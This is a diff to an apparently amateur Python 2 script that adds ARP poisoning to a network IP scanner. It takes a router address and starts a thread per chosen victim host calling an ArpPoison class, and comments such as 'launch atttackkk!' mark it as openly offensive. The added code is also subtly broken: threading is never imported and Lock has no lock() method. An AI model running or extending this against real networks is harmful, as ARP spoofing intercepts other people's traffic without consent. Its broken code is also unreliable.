@@ -1,4 +1,5 @@
 from ipScanner import IpScanner
+from arpPoison import ArpPoison
 import sys
 
 def main():
@@ -11,8 +12,10 @@ def main():
         args.remove('-i')
     scanner = None
     
+    routerIP = sys.argv[1]
+
     try:
-        ip = args[1]
+        ip = args[2]
         scanner = IpScanner(ip)
     except: 
         scanner = IpScanner()
@@ -47,6 +50,24 @@ def main():
         attacklist = targetlist
         #iteraction avec usager pour les target
     print attacklist
+        
+    stopList = []
+    for i in attacklist:
+        t = threading.Thread(target=worker,args=(i,routerIP,stopList))
+        t.start()
+
+    while True:
+        answer = raw_input()
+        if answer == 'stop':
+            break
+
+
+
+def worker(ipVictim, ipAttack, stopList):
+    l = threading.Lock()
+    l.lock()
+    stopList.append(ArpPoison(ipAttack, ipVictim))
+    l.release()
 
     #launch atttackkk! 
 if __name__ == "__main__":
